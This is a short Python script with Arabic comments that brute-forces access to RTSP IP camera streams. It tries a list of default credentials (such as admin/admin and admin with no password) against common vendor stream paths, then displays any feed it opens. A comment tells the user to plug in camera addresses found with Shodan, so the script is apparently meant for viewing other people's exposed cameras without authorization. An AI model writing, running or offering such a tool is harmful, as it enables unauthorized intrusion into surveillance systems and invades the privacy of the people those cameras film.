import cv2
import os

# 👈 حط الـ IP والبورت اللي طلعتهم من أداة Shodan
IP = "192.168.1.100"  # غير هذا للـ IP اللي تبيه
PORT = "554"

# المسارات الشائعة للكاميرات
PATHS = [
    "/Streaming/Channels/101",
    "/h264/ch1/main/av_stream",
    "/cam/realmonitor?channel=1&subtype=0",
    "/live/ch0",
    "/11",
    "/12",
    "/onvif-http/snapshot",
    "/user=admin_password=_channel=1_stream=0.sdp",
]

CREDS = [
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "12345"),
    ("admin", "123456"),
    (None, None) # بدون باسورد
]

def test_camera(ip, port, path, user, password):
    if user and password is not None:
        url = f"rtsp://{user}:{password}@{ip}:{port}{path}"
    elif user and password == "":
        url = f"rtsp://{user}@{ip}:{port}{path}"
    else:
        url = f"rtsp://{ip}:{port}{path}"

    print(f"[*] Trying: {url}")

    # فتح البث (نتجاهل الأخطاء المزعجة)
    os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = "rtsp_transport;udp"
    cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)

    if cap.isOpened():
        ret, frame = cap.read()
        if ret:
            print(f"[+] SUCCESS! Stream found: {url}")
            # عرض الفيديو
            while True:
                ret, frame = cap.read()
                if not ret:
                    print("[-] Stream disconnected.")
                    break
                cv2.imshow(f"Camera Stream - {ip}", frame)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
            cap.release()
            cv2.destroyAllWindows()
            return True
    cap.release()
    return False

def main():
    print("=====================================")
    print("   RTSP Camera Viewer")
    print("   | By @cccc.c8 | @khbo5")
    print("=====================================\n")

    for user, password in CREDS:
        for path in PATHS:
            if test_camera(IP, PORT, path, user, password):
                return # توقف إذا لقينا وحدة
    print("[-] Could not find a working stream path or credentials.")

if __name__ == "__main__":
    main()